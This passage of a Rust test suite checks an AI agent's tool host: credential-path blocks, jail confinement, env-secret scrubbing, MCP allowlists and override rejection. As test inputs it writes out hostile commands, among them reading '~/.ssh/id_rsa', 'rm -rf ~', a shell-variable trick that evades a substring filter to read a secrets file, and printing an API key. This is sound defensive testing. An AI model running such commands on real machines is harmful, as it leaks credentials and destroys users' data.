        let audit = Arc::new(CapturingAudit::new());
        let receipts = Arc::new(CapturingReceipts::new());
        receipts.set_failing();
        let (host, _dir) = fresh_host_with_receipts(
            audit,
            Arc::clone(&receipts) as Arc<dyn ToolHostReceipts>,
            Arc::new(FakeEgressGate::allow()),
            crate::toolhost::policy::RootMode::TempSandbox,
        )
        .await;
        let conf = FakeConfirmation::approve();
        let err = host
            .execute_governed(
                req(
                    dangerous_client(),
                    "write",
                    json!({"path":"nope.txt","content":"x"}),
                ),
                &conf,
            )
            .await
            .expect_err("receipt failure must deny");
        assert!(
            matches!(&err, ToolHostError::Denied(r) if r == "receipt_write_failed"),
            "got {err:?}"
        );
        // The mutation never ran: the file must not exist.
        assert!(
            host.env
                .read_file_full(std::path::Path::new("nope.txt"), 1024)
                .await
                .is_err(),
            "denied mutation must not create the file"
        );
    }

    #[tokio::test]
    async fn receipt_for_fresh_write_notes_absent_pre_image() {
        // A write to a NON-existent target has no pre-image → note "absent".
        let audit = Arc::new(CapturingAudit::new());
        let receipts = Arc::new(CapturingReceipts::new());
        let (host, _dir) = fresh_host_with_receipts(
            audit,
            Arc::clone(&receipts) as Arc<dyn ToolHostReceipts>,
            Arc::new(FakeEgressGate::allow()),
            crate::toolhost::policy::RootMode::TempSandbox,
        )
        .await;
        let conf = FakeConfirmation::approve();
        host.execute_governed(
            req(
                dangerous_client(),
                "write",
                json!({"path":"fresh.txt","content":"hi"}),
            ),
            &conf,
        )
        .await
        .expect("approved + ran");
        let snap = receipts.snapshot();
        assert_eq!(snap[0].pre_image_sha256, None);
        assert_eq!(snap[0].pre_image_note, Some("absent"));
    }

    #[tokio::test]
    async fn receipt_for_bash_records_command_without_pre_image() {
        // A bash mutation records the (redacted, bounded) command with no
        // pre-image and note "not_applicable".
        let audit = Arc::new(CapturingAudit::new());
        let receipts = Arc::new(CapturingReceipts::new());
        let (host, _dir) = fresh_host_with_receipts(
            audit,
            Arc::clone(&receipts) as Arc<dyn ToolHostReceipts>,
            Arc::new(FakeEgressGate::allow()),
            crate::toolhost::policy::RootMode::TempSandbox,
        )
        .await;
        let conf = FakeConfirmation::approve();
        // `echo` is benign — passes damage control, confirmed, runs.
        let _ = host
            .execute_governed(
                req(dangerous_client(), "bash", json!({"command":"echo hi"})),
                &conf,
            )
            .await;
        let snap = receipts.snapshot();
        assert_eq!(snap.len(), 1, "bash mutation records a receipt");
        assert_eq!(snap[0].tool, "bash");
        assert_eq!(snap[0].path, None);
        assert_eq!(snap[0].pre_image_note, Some("not_applicable"));
        // The redacted detail carries the command preview (bash command IS the action).
        let serialized = serde_json::to_string(&snap[0].detail).expect("serialize");
        assert!(
            serialized.contains("echo hi"),
            "command preview present: {serialized}"
        );
    }

    #[tokio::test]
    async fn no_receipt_for_non_mutating_read() {
        // A safe read produces NO mutation receipt (read is not a mutation).
        let audit = Arc::new(CapturingAudit::new());
        let receipts = Arc::new(CapturingReceipts::new());
        let (host, _dir) = fresh_host_with_receipts(
            audit,
            Arc::clone(&receipts) as Arc<dyn ToolHostReceipts>,
            Arc::new(FakeEgressGate::allow()),
            crate::toolhost::policy::RootMode::TempSandbox,
        )
        .await;
        host.env
            .write_file(std::path::Path::new("r.txt"), "hi")
            .await
            .expect("seed");
        let conf = FakeConfirmation::approve();
        host.execute_governed(
            req(
                client(&[Scope::ToolExecuteSafe]),
                "read",
                json!({"path":"r.txt"}),
            ),
            &conf,
        )
        .await
        .expect("read runs");
        assert!(
            receipts.snapshot().is_empty(),
            "read must not record a mutation receipt"
        );
    }

    // -----------------------------------------------------------------------
    // B3: DamageControl parity (protected paths + disaster tier), end-to-end
    // -----------------------------------------------------------------------

    #[tokio::test]
    async fn governed_bash_credential_read_denies_without_prompting() {
        // Reading a credential file via bash is a hard Block — deny, no prompt.
        let audit = Arc::new(CapturingAudit::new());
        let (host, _dir) = fresh_host(Arc::clone(&audit), Arc::new(FakeEgressGate::allow())).await;
        let conf = FakeConfirmation::approve();
        let err = host
            .execute_governed(
                req(
                    dangerous_client(),
                    "bash",
                    json!({"command":"cat ~/.ssh/id_rsa"}),
                ),
                &conf,
            )
            .await
            .expect_err("must deny");
        assert!(matches!(err, ToolHostError::Denied(_)));
        assert!(!conf.was_called(), "a Block must never prompt the owner");
        assert_eq!(audit.snapshot()[0].reason, "protected_credential_path");
    }

    #[tokio::test]
    async fn governed_write_to_home_credential_path_denies() {
        // A write whose path names a home-anchored credential file is Blocked.
        let audit = Arc::new(CapturingAudit::new());
        let (host, _dir) = fresh_host(Arc::clone(&audit), Arc::new(FakeEgressGate::allow())).await;
        let conf = FakeConfirmation::approve();
        let err = host
            .execute_governed(
                req(
                    dangerous_client(),
                    "write",
                    json!({"path":"~/.aws/credentials","content":"x"}),
                ),
                &conf,
            )
            .await
            .expect_err("must deny");
        assert!(matches!(err, ToolHostError::Denied(_)));
        assert!(!conf.was_called());
        assert_eq!(audit.snapshot()[0].reason, "protected_credential_path");
    }

    #[tokio::test]
    async fn governed_bash_home_wipe_disaster_denies_without_prompting() {
        // `rm -rf ~` is the Disaster tier — deny, no prompt, prominent reason.
        let audit = Arc::new(CapturingAudit::new());
        let (host, _dir) = fresh_host(Arc::clone(&audit), Arc::new(FakeEgressGate::allow())).await;
        let conf = FakeConfirmation::approve();
        let err = host
            .execute_governed(
                req(dangerous_client(), "bash", json!({"command":"rm -rf ~"})),
                &conf,
            )
            .await
            .expect_err("must deny");
        assert!(matches!(err, ToolHostError::Denied(_)));
        assert!(!conf.was_called());
        assert_eq!(audit.snapshot()[0].reason, "rm_home_directory");
    }

    // -----------------------------------------------------------------------
    // B2: execution isolation
    // -----------------------------------------------------------------------

    #[tokio::test]
    async fn required_jail_without_backend_denies_without_running() {
        // Fail-closed: a non-interactive origin REQUIRES the jail; if no backend
        // is available the call denies BEFORE any policy eval or tool dispatch.
        let audit = Arc::new(CapturingAudit::new());
        let (mut host, _dir) =
            fresh_host(Arc::clone(&audit), Arc::new(FakeEgressGate::allow())).await;
        host.set_jail_available(false); // simulate an old kernel / missing sandbox-exec
        let conf = FakeConfirmation::approve();
        // A plain safe read (no confirm) from a Proactive origin → jailed required.
        let err = host
            .execute_governed(
                req_origin(
                    client(&[Scope::ToolExecuteSafe]),
                    "read",
                    json!({"path":"a.txt"}),
                    ToolOrigin::Proactive,
                ),
                &conf,
            )
            .await
            .expect_err("must deny when the required jail is unavailable");
        match err {
            ToolHostError::Denied(reason) => assert_eq!(reason, "isolation_unavailable"),
            other => panic!("expected Denied(isolation_unavailable), got {other:?}"),
        }
        assert!(!conf.was_called(), "must deny without prompting");
        let rows = audit.snapshot();
        assert_eq!(rows.len(), 1);
        assert_eq!(rows[0].reason, "isolation_unavailable");
        assert_eq!(rows[0].isolation, "jailed");
    }

    #[tokio::test]
    async fn owner_interactive_runs_on_host_even_without_backend() {
        // The owner's interactive turn does NOT require the jail, so it runs on
        // the host tier regardless of backend availability. The audit records
        // the host tier.
        let audit = Arc::new(CapturingAudit::new());
        let (mut host, _dir) =
            fresh_host(Arc::clone(&audit), Arc::new(FakeEgressGate::allow())).await;
        host.set_jail_available(false);
        host.env
            .write_file(std::path::Path::new("a.txt"), "hi")
            .await
            .expect("write");
        let conf = FakeConfirmation::approve();
        let r = host
            .execute_governed(
                req_origin(
                    client(&[Scope::ToolExecuteSafe]),
                    "read",
                    json!({"path":"a.txt"}),
                    ToolOrigin::OwnerInteractive,
                ),
                &conf,
            )
            .await
            .expect("owner-interactive read runs on host");
        assert!(!r.output.content.is_empty());
        assert_eq!(audit.snapshot()[0].isolation, "host");
    }

    #[tokio::test]
    async fn jailed_bash_confines_writes_to_the_root() {
        // The load-bearing proof: a jailed `bash` may write INSIDE the root but
        // NOT to a sibling directory outside it, while the same write on the
        // host tier (control) succeeds — so the denial is the OS jail, not perms.
        //
        // Uses dirs under the crate's `target/` (a non-temp base) so the sibling
        // is outside every write-allowed subpath (root + system temp).
        if !isolation::jail_backend_available() {
            eprintln!("skip: no OS sandbox backend on this runner (jail unavailable)");
            return;
        }
        let audit = Arc::new(CapturingAudit::new());
        // Build a durable host rooted OUTSIDE the system temp so the sibling
        // "outside" dir is not in the allow set.
        let nonce = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0);
        let base = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("target")
            .join(format!("faejail-it-{nonce}"));
        let root = base.join("root");
        let outside = base.join("outside");
        std::fs::create_dir_all(&root).expect("mk root");
        std::fs::create_dir_all(&outside).expect("mk outside");
        let host = ToolHost::with_wiring(
            root.clone(),
            Limits::default(),
            Arc::clone(&audit) as Arc<dyn ToolHostAudit>,
            Arc::new(CapturingReceipts::new()) as Arc<dyn ToolHostReceipts>,
            Arc::new(FakeEgressGate::allow()),
            Arc::new(FixedClock),
            crate::toolhost::policy::RootMode::DurableWorkspace,
        )
        .await
        .expect("durable host");

        let outside_probe = outside.join("escape.txt");
        let outside_cmd = format!("touch {}", shell_quote(&outside_probe.to_string_lossy()));
        let conf = FakeConfirmation::approve();

        // 1. Jailed write OUTSIDE the root must fail (non-zero exit under jail).
        let jailed_out = host
            .execute_governed(
                req_origin(
                    dangerous_client(),
                    "bash",
                    json!({ "command": outside_cmd }),
                    ToolOrigin::Proactive,
                ),
                &conf,
            )
            .await
            .expect("bash runs (the write inside it is what's denied)");
        let exit_out = jailed_out
            .output
            .details
            .as_ref()
            .and_then(|d| d.get("exit_code"))
            .and_then(|v| v.as_i64())
            .expect("exit_code");
        assert_ne!(exit_out, 0, "jailed write outside the root must fail");
        assert!(
            !outside_probe.exists(),
            "the outside file must not have been created under the jail"
        );

        // 2. Jailed write INSIDE the root must succeed (exit 0 + file present).
        let jailed_in = host
            .execute_governed(
                req_origin(
                    dangerous_client(),
                    "bash",
                    json!({ "command": "touch inside.txt" }),
                    ToolOrigin::Proactive,
                ),
                &conf,
            )
            .await
            .expect("inside write runs");
        let exit_in = jailed_in
            .output
            .details
            .as_ref()
            .and_then(|d| d.get("exit_code"))
            .and_then(|v| v.as_i64())
            .expect("exit_code");
        assert_eq!(exit_in, 0, "jailed write inside the root must succeed");
        assert!(root.join("inside.txt").exists(), "inside file must exist");

        // 3. Control: the SAME outside write on the HOST tier succeeds — proving
        //    the denial above was the OS jail, not a permission error.
        let host_out = host
            .execute_governed(
                req_origin(
                    dangerous_client(),
                    "bash",
                    json!({ "command": outside_cmd }),
                    ToolOrigin::OwnerInteractive,
                ),
                &conf,
            )
            .await
            .expect("host bash runs");
        let exit_host = host_out
            .output
            .details
            .as_ref()
            .and_then(|d| d.get("exit_code"))
            .and_then(|v| v.as_i64())
            .expect("exit_code");
        assert_eq!(exit_host, 0, "host write outside the root should succeed");
        assert!(
            outside_probe.exists(),
            "host tier should have created the outside file"
        );

        let _ = std::fs::remove_dir_all(&base);
    }

    /// Quote a path for safe inclusion in a `sh -c` command (test helper).
    fn shell_quote(s: &str) -> String {
        format!("'{}'", s.replace('\'', "'\\''"))
    }

    // -----------------------------------------------------------------------
    // C1+C2: Host-tier `bash` hardening on the REAL execute_governed dispatch
    // -----------------------------------------------------------------------

    /// Concatenate the text chunks of a fluers `bash` ToolResult (the human
    /// `[exit N] --- stdout --- … --- stderr --- …` blob).
    #[cfg(any(target_os = "macos", target_os = "linux"))]
    fn bash_result_text(r: &ToolHostResult) -> String {
        r.output
            .content
            .iter()
            .filter_map(|c| c.get("text").and_then(|t| t.as_str()))
            .collect::<Vec<_>>()
            .join("\n")
    }

    /// The `exit_code` from a fluers `bash` ToolResult's structured details.
    #[cfg(any(target_os = "macos", target_os = "linux"))]
    fn bash_exit(r: &ToolHostResult) -> i64 {
        r.output
            .details
            .as_ref()
            .and_then(|d| d.get("exit_code"))
            .and_then(serde_json::Value::as_i64)
            .unwrap_or(i64::MIN)
    }

    #[cfg(target_os = "macos")]
    #[tokio::test]
    async fn host_bash_denies_protected_reads_and_scrubs_env_on_real_dispatch() {
        // THE CRUX: drive a HOST-origin `bash` through the REAL execute_governed →
        // run_tool dispatch (the exact path a `None`-origin `toolhost.execute`
        // takes) and prove the daemon (1) denies reading a protected file even
        // when the command EVADES the substring DamageControl gate, (2) scrubs the
        // planted provider secret from the child env, and (3) still runs legitimate
        // bash (echo + a non-protected read).
        if !isolation::jail_backend_available() {
            eprintln!("skip: no seatbelt backend on this runner");
            return;
        }
        // A hermetic temp "home" holding a planted protected file. We point the
        // host's protected-read set at it via `set_home` (NOT `set_var("HOME")`,
        // which would race concurrent host-constructing tests under `cargo test`).
        let home = tempfile::tempdir().expect("home");
        let home_path = home.path().to_path_buf();
        let home_str = home_path.to_string_lossy().into_owned();
        // Secret values built by concatenation (git push-protection).
        let file_secret = format!("{}-{}", "PROTECTED", "secret-file-value-abc");
        let api_key = format!("{}-{}", "planted", "env-key-value-xyz");
        std::fs::write(home_path.join(".secrets"), &file_secret).expect("write .secrets");
        std::fs::write(home_path.join("notsecret.txt"), "public-ok").expect("write notsecret");
        // The env plant proves C1; the value is scrubbed regardless, so a
        // concurrent env-scrub test cannot invalidate the "absent" assertion.
        std::env::set_var("FAE_OPENROUTER_API_KEY", &api_key);

        let root = tempfile::tempdir().expect("root");
        let audit = Arc::new(CapturingAudit::new());
        let mut host = ToolHost::with_wiring(
            root.path().to_path_buf(),
            Limits::default(),
            Arc::clone(&audit) as Arc<dyn ToolHostAudit>,
            Arc::new(CapturingReceipts::new()) as Arc<dyn ToolHostReceipts>,
            Arc::new(FakeEgressGate::allow()),
            Arc::new(FixedClock),
            crate::toolhost::policy::RootMode::TempSandbox,
        )
        .await
        .expect("host");
        host.set_home(Some(home_str.clone()));
        let conf = FakeConfirmation::approve();
        let run = |cmd: String| {
            host.execute_governed(
                req_origin(
                    dangerous_client(),
                    "bash",
                    json!({ "command": cmd }),
                    ToolOrigin::OwnerInteractive,
                ),
                &conf,
            )
        };

        // (1) Evasive protected read: the protected path is reached through a
        //     shell var (`h=<home>; cat "$h/.secrets"`) so the command text never
        //     spells `<home>/.secrets` literally — the substring DamageControl gate
        //     ALLOWS it, and the seatbelt must deny the read at execution.
        let protected = run(format!("h={}; cat \"$h/.secrets\"", shell_quote(&home_str)))
            .await
            .expect("bash runs");
        // (2) Env exfil attempt.
        let env_leak = run("printenv FAE_OPENROUTER_API_KEY".to_string())
            .await
            .expect("bash runs");
        // (3a) Benign bash.
        let echo = run("echo hello".to_string()).await.expect("bash runs");
        // (3b) Legitimate non-protected read (same home dir, non-protected file).
        let public = run(format!(
            "h={}; cat \"$h/notsecret.txt\"",
            shell_quote(&home_str)
        ))
        .await
        .expect("bash runs");

        std::env::remove_var("FAE_OPENROUTER_API_KEY");

        // (1) protected read denied: no secret bytes + non-zero exit.
        let ptext = bash_result_text(&protected);
        assert!(
            !ptext.contains(&file_secret),
            "protected file contents leaked through host bash: {ptext}"
        );
        assert_ne!(
            bash_exit(&protected),
            0,
            "protected read must fail under the seatbelt: {ptext}"
        );

        // (2) env scrub: the planted key is absent from the child's env view.
        let etext = bash_result_text(&env_leak);
        assert!(
            !etext.contains(&api_key),
            "provider secret leaked into host bash env: {etext}"
        );

        // (3a) benign bash still works.
        let echotext = bash_result_text(&echo);
        assert_eq!(bash_exit(&echo), 0, "echo must succeed: {echotext}");
        assert!(
            echotext.contains("hello"),
            "echo output missing: {echotext}"
        );

        // (3b) non-protected read still works.
        let pubtext = bash_result_text(&public);
        assert_eq!(
            bash_exit(&public),
            0,
            "non-protected read must succeed: {pubtext}"
        );
        assert!(
            pubtext.contains("public-ok"),
            "non-protected file content missing: {pubtext}"
        );
    }

    #[cfg(target_os = "linux")]
    #[tokio::test]
    async fn host_bash_scrubs_env_on_linux_even_without_read_deny() {
        // On Linux the env scrub closes C1 (secret exfil). The protected-READ
        // deny is a documented residual (Landlock is grant-based, cannot express a
        // deny-read for a general shell), so we assert ONLY the env scrub + that
        // legitimate bash still runs — NOT a kernel read-deny.
        // The env plant proves C1; the value is scrubbed regardless. `home` is
        // irrelevant on Linux (no read-deny), so we do NOT mutate `HOME` (which
        // would race concurrent host-constructing tests under `cargo test`).
        let api_key = format!("{}-{}", "planted", "env-key-value-linux");
        std::env::set_var("FAE_OPENROUTER_API_KEY", &api_key);

        let root = tempfile::tempdir().expect("root");
        let audit = Arc::new(CapturingAudit::new());
        let host = ToolHost::with_wiring(
            root.path().to_path_buf(),
            Limits::default(),
            Arc::clone(&audit) as Arc<dyn ToolHostAudit>,
            Arc::new(CapturingReceipts::new()) as Arc<dyn ToolHostReceipts>,
            Arc::new(FakeEgressGate::allow()),
            Arc::new(FixedClock),
            crate::toolhost::policy::RootMode::TempSandbox,
        )
        .await
        .expect("host");
        let conf = FakeConfirmation::approve();

        let leak = host
            .execute_governed(
                req_origin(
                    dangerous_client(),
                    "bash",
                    json!({ "command": "printenv FAE_OPENROUTER_API_KEY" }),
                    ToolOrigin::OwnerInteractive,
                ),
                &conf,
            )
            .await
            .expect("bash runs");
        let echo = host
            .execute_governed(
                req_origin(
                    dangerous_client(),
                    "bash",
                    json!({ "command": "echo hello" }),
                    ToolOrigin::OwnerInteractive,
                ),
                &conf,
            )
            .await
            .expect("bash runs");

        std::env::remove_var("FAE_OPENROUTER_API_KEY");

        let ltext = bash_result_text(&leak);
        assert!(
            !ltext.contains(&api_key),
            "provider secret leaked into Linux host bash env: {ltext}"
        );
        let etext = bash_result_text(&echo);
        assert_eq!(bash_exit(&echo), 0, "echo must succeed on Linux: {etext}");
        assert!(
            etext.contains("hello"),
            "echo output missing on Linux: {etext}"
        );
    }

    // -----------------------------------------------------------------------
    // Phase G3: external MCP tool tier (the declaration/allowlist/scope/origin gate)
    // -----------------------------------------------------------------------

    use crate::mcp::{catalog_from_mock, MockConn};

    /// A host wired with an MCP catalog built from a single mock server exposing
    /// `echo` (allowlisted) + `secret` (offered but NOT allowlisted).
    async fn host_with_mcp(
        audit: Arc<CapturingAudit>,
        receipts: Arc<dyn ToolHostReceipts>,
        conn: Arc<MockConn>,
    ) -> (ToolHost, tempfile::TempDir) {
        let catalog = Arc::new(catalog_from_mock("fs", conn, &["echo"]).await);
        let (host, dir) = fresh_host_with_receipts(
            audit,
            receipts,
            Arc::new(FakeEgressGate::allow()),
            crate::toolhost::policy::RootMode::TempSandbox,
        )
        .await;
        (host.with_mcp_catalog(catalog), dir)
    }

    fn mcp_client() -> ClientRecord {
        client(&[Scope::McpInvoke])
    }

    #[tokio::test]
    async fn mcp_owner_interactive_invokes_and_records_external_receipt() {
        let audit = Arc::new(CapturingAudit::new());
        let receipts = Arc::new(CapturingReceipts::new());
        let conn = MockConn::new(
            "fs",
            vec![("echo", "echo"), ("secret", "no")],
            "mcp-said-hi",
        );
        let (host, _dir) = host_with_mcp(
            Arc::clone(&audit),
            Arc::clone(&receipts) as Arc<dyn ToolHostReceipts>,
            Arc::clone(&conn),
        )
        .await;
        let conf = FakeConfirmation::approve();
        let r = host
            .execute_governed(
                req_origin(
                    mcp_client(),
                    "mcp:fs:echo",
                    json!({"msg": "hi"}),
                    ToolOrigin::OwnerInteractive,
                ),
                &conf,
            )
            .await
            .expect("owner-interactive mcp call runs");
        assert_eq!(r.output.content, vec![Value::String("mcp-said-hi".into())]);
        assert!(
            !conf.was_called(),
            "mcp never uses the owner-confirm channel"
        );
        assert_eq!(conn.call_count(), 1, "the external server was invoked once");
        // Audit: allowed, honest external isolation label.
        let row = &audit.snapshot()[0];
        assert_eq!(row.decision, AuditDecision::Allowed);
        assert_eq!(row.reason, "allowed");
        assert_eq!(row.risk_class, "Mcp");
        assert_eq!(row.isolation, "external");
        // Receipt: names the external server, marks it external (not jailed).
        let receipt = &receipts.snapshot()[0];
        assert_eq!(receipt.tool, "mcp:fs:echo");
        assert_eq!(receipt.outcome, "invoked");
        assert_eq!(receipt.pre_image_note, Some("external"));
    }

    #[tokio::test]
    async fn mcp_proactive_origin_denied_without_invoking() {
        // Origin gate: an autonomous turn must never reach an unconfined external
        // process. Deny BEFORE the server is touched.
        let audit = Arc::new(CapturingAudit::new());
        let receipts = Arc::new(CapturingReceipts::new());
        let conn = MockConn::new("fs", vec![("echo", "echo")], "x");
        let (host, _dir) = host_with_mcp(
            Arc::clone(&audit),
            Arc::clone(&receipts) as Arc<dyn ToolHostReceipts>,
            Arc::clone(&conn),
        )
        .await;
        let conf = FakeConfirmation::approve();
        let err = host
            .execute_governed(
                req_origin(
                    mcp_client(),
                    "mcp:fs:echo",
                    json!({}),
                    ToolOrigin::Proactive,
                ),
                &conf,
            )
            .await
            .expect_err("proactive mcp must deny");
        assert!(
            matches!(&err, ToolHostError::Denied(r) if r == "mcp_origin_forbidden"),
            "{err:?}"
        );
        assert_eq!(conn.call_count(), 0, "denied origin must not invoke");
        assert!(
            receipts.snapshot().is_empty(),
            "no receipt on a denied call"
        );
        assert_eq!(audit.snapshot()[0].reason, "mcp_origin_forbidden");
    }

    #[tokio::test]
    async fn mcp_missing_scope_denied() {
        // A client WITHOUT McpInvoke is denied at the inner scope gate.
        let audit = Arc::new(CapturingAudit::new());
        let receipts = Arc::new(CapturingReceipts::new());
        let conn = MockConn::new("fs", vec![("echo", "echo")], "x");
        let (host, _dir) = host_with_mcp(
            Arc::clone(&audit),
            Arc::clone(&receipts) as Arc<dyn ToolHostReceipts>,
            Arc::clone(&conn),
        )
        .await;
        let conf = FakeConfirmation::approve();
        let err = host
            .execute_governed(
                req_origin(
                    client(&[Scope::ToolExecuteSafe]), // no McpInvoke
                    "mcp:fs:echo",
                    json!({}),
                    ToolOrigin::OwnerInteractive,
                ),
                &conf,
            )
            .await
            .expect_err("missing McpInvoke must deny");
        assert!(
            matches!(&err, ToolHostError::Denied(r) if r == "missing_scope"),
            "{err:?}"
        );
        assert_eq!(conn.call_count(), 0);
    }

    #[tokio::test]
    async fn mcp_non_allowlisted_tool_denied() {
        // `secret` is offered by the server but not allowlisted => never in the
        // catalog => a fail-closed `mcp_tool_not_declared` deny.
        let audit = Arc::new(CapturingAudit::new());
        let receipts = Arc::new(CapturingReceipts::new());
        let conn = MockConn::new("fs", vec![("echo", "echo"), ("secret", "no")], "x");
        let (host, _dir) = host_with_mcp(
            Arc::clone(&audit),
            Arc::clone(&receipts) as Arc<dyn ToolHostReceipts>,
            Arc::clone(&conn),
        )
        .await;
        let conf = FakeConfirmation::approve();
        let err = host
            .execute_governed(
                req_origin(
                    mcp_client(),
                    "mcp:fs:secret",
                    json!({}),
                    ToolOrigin::OwnerInteractive,
                ),
                &conf,
            )
            .await
            .expect_err("non-allowlisted tool must deny");
        assert!(
            matches!(&err, ToolHostError::Denied(r) if r == "mcp_tool_not_declared"),
            "{err:?}"
        );
        assert_eq!(conn.call_count(), 0);
    }

    #[tokio::test]
    async fn mcp_no_catalog_denied() {
        // A host with NO MCP catalog denies every `mcp:` call `mcp_not_configured`.
        let audit = Arc::new(CapturingAudit::new());
        let (host, _dir) = fresh_host(Arc::clone(&audit), Arc::new(FakeEgressGate::allow())).await;
        let conf = FakeConfirmation::approve();
        let err = host
            .execute_governed(
                req_origin(
                    mcp_client(),
                    "mcp:fs:echo",
                    json!({}),
                    ToolOrigin::OwnerInteractive,
                ),
                &conf,
            )
            .await
            .expect_err("no catalog must deny");
        assert!(
            matches!(&err, ToolHostError::Denied(r) if r == "mcp_not_configured"),
            "{err:?}"
        );
        assert_eq!(audit.snapshot()[0].reason, "mcp_not_configured");
    }

    // -----------------------------------------------------------------------
    // Security-override Wave 1 — evaluate_security_override, one test per vector
    // -----------------------------------------------------------------------

    /// `FixedClock` "now". Valid overrides expire after it; expired ones before it.
    const NOW_MS: u64 = 1_700_000_000_000;
    const VALID_EXPIRY: u64 = NOW_MS + 60_000;

    /// A ToolHost whose `home` is a temp dir we control + plant secret/never files
    /// into. Returns (host, home TempDir, canonical home path, workspace TempDir).
    /// Sets `HOME` for construction — nextest runs each test in its own process, so
    /// the process-global env plant is race-free under the gate.
    async fn host_with_planted_home(
        audit: Arc<CapturingAudit>,
    ) -> (ToolHost, tempfile::TempDir, PathBuf, tempfile::TempDir) {
        let home = tempfile::tempdir().expect("home tempdir");
        let real_home = std::fs::canonicalize(home.path()).expect("canon home");
        // Fake secret content, built by concatenation (never a secret-shaped literal).
        let fake_secret = format!("SECRET_{}_{}", "planted", "abc123def456");
        let plant = |rel: &str, body: &str| {
            let p = real_home.join(rel);
            if let Some(parent) = p.parent() {
                std::fs::create_dir_all(parent).expect("mkdir");
            }
            std::fs::write(&p, body).expect("plant");
        };
        plant(".secrets", &fake_secret);
        plant(".ssh/id_rsa", &fake_secret);
        plant("Library/Application Support/fae/models.lock", "schema=1");
        plant("Library/Application Support/fae/grant-store.json", "{}");
        plant("notes.txt", "just notes");
        std::fs::create_dir_all(real_home.join("adir")).expect("mkdir adir");

        let workspace = tempfile::tempdir().expect("ws tempdir");
        let receipts = Arc::new(CapturingReceipts::new()) as Arc<dyn ToolHostReceipts>;
        let audit_dyn: Arc<dyn ToolHostAudit> = audit;
        let mut host = ToolHost::with_wiring(
            workspace.path().to_path_buf(),
            Limits::default(),
            audit_dyn,
            receipts,
            Arc::new(FakeEgressGate::allow()),
            Arc::new(FixedClock),
            crate::toolhost::policy::RootMode::TempSandbox,
        )
        .await
        .expect("host");
        // Point the host's home at the planted temp dir WITHOUT mutating the global
        // `HOME` env (the justfile gate runs `cargo test`, which shares the process
        // env across concurrently-running tests — an env plant would race). Tests are
        // a child module, so the private `home` field is directly settable.
        host.home = Some(real_home.to_string_lossy().into_owned());
        (host, home, real_home, workspace)
    }

    fn mk_override(call_id: &str, target: &str, tier: &str, expiry_ms: u64) -> SecurityOverride {
        SecurityOverride {
            call_id: call_id.into(),
            target_path: target.into(),
            tier: tier.into(),
            grant_kind: "once".into(),
            expiry_ms,
        }
    }

    fn req_override(
        origin: ToolOrigin,
        call_id: &str,
        ov: Option<SecurityOverride>,
    ) -> ToolHostRequest {
        ToolHostRequest {
            client: dangerous_client(),
            tool: "bash".into(),
            input: json!({ "command": "echo hi" }),
            call_id: call_id.into(),
            cancel: CancellationToken::new(),
            origin,
            security_override: ov,
            network_denied: false,
        }
    }

    #[tokio::test]
    async fn override_absent_is_none_and_emits_no_audit() {
        // Invariant F: no override ⇒ no relaxation AND no audit row (today's path).
        let audit = Arc::new(CapturingAudit::new());
        let (host, _h, _rh, _w) = host_with_planted_home(Arc::clone(&audit)).await;
        let req = req_override(ToolOrigin::OwnerInteractive, "c1", None);
        let d = host.evaluate_security_override(&req, IsolationMode::Host);
        assert!(matches!(d, OverrideDecision::None));
        assert!(
            audit.snapshot().is_empty(),
            "absent override must not audit: {:?}",
            audit.snapshot()
        );
    }

    #[tokio::test]
    async fn override_non_interactive_origin_rejected_and_audited() {
        // L1: an override on a non-interactive origin is rejected + audited.
        let audit = Arc::new(CapturingAudit::new());
        let (host, _h, rh, _w) = host_with_planted_home(Arc::clone(&audit)).await;
        let target = rh.join(".secrets");
        let ov = mk_override("c1", &target.to_string_lossy(), "secrets", VALID_EXPIRY);
        let req = req_override(ToolOrigin::Proactive, "c1", Some(ov));
        let d = host.evaluate_security_override(&req, IsolationMode::Jailed);
        assert!(matches!(d, OverrideDecision::Rejected));
        let rows = audit.snapshot();
        assert_eq!(rows.len(), 1);
        assert_eq!(rows[0].event_type, "security_override");
        assert_eq!(rows[0].decision, AuditDecision::Denied);
        assert_eq!(rows[0].reason, "reject_non_interactive_origin");
    }

    #[tokio::test]
    async fn override_never_path_rejected() {
        // L3: a Fae-integrity/never target (models.lock, grant-store) is hard-rejected.
        for rel in [
            "Library/Application Support/fae/models.lock",
            "Library/Application Support/fae/grant-store.json",
        ] {
            let audit = Arc::new(CapturingAudit::new());
            let (host, _h, rh, _w) = host_with_planted_home(Arc::clone(&audit)).await;
            let target = rh.join(rel);
            let ov = mk_override("c1", &target.to_string_lossy(), "general", VALID_EXPIRY);
            let req = req_override(ToolOrigin::OwnerInteractive, "c1", Some(ov));
            let d = host.evaluate_security_override(&req, IsolationMode::Host);
            assert!(matches!(d, OverrideDecision::Rejected), "{rel} must reject");
            assert_eq!(audit.snapshot()[0].reason, "reject_never_path", "{rel}");
        }
    }

    #[tokio::test]
    async fn override_directory_target_rejected() {
        // L4: a directory target is rejected (file-granular only).
        let audit = Arc::new(CapturingAudit::new());
        let (host, _h, rh, _w) = host_with_planted_home(Arc::clone(&audit)).await;
        let target = rh.join("adir");
        let ov = mk_override("c1", &target.to_string_lossy(), "general", VALID_EXPIRY);
        let req = req_override(ToolOrigin::OwnerInteractive, "c1", Some(ov));
        let d = host.evaluate_security_override(&req, IsolationMode::Host);
        assert!(matches!(d, OverrideDecision::Rejected));
        assert_eq!(audit.snapshot()[0].reason, "reject_directory");
    }

    #[tokio::test]
    async fn override_uncanonicalizable_target_rejected() {
        // L4: a target that does not resolve (incl. a `..`-escape to a missing path)
        // is rejected — the canonical-escape defense (`realpath` first).
        let audit = Arc::new(CapturingAudit::new());
        let (host, _h, rh, _w) = host_with_planted_home(Arc::clone(&audit)).await;
        let target = rh.join("work/../../.secrets-does-not-exist");
        let ov = mk_override("c1", &target.to_string_lossy(), "secrets", VALID_EXPIRY);
        let req = req_override(ToolOrigin::OwnerInteractive, "c1", Some(ov));
        let d = host.evaluate_security_override(&req, IsolationMode::Host);
        assert!(matches!(d, OverrideDecision::Rejected));
        assert_eq!(audit.snapshot()[0].reason, "reject_uncanonicalizable");
    }

    #[tokio::test]
    async fn override_symlink_to_dir_secret_child_relaxes_but_stays_denied() {
        // Canonical-escape: a workspace symlink → a file UNDER ~/.ssh canonicalizes
        // into the Secrets tier (network-denied), and the file-granular relaxation
        // leaves the ~/.ssh subpath deny in place — the child stays blocked (L4).
        #[cfg(unix)]
        {
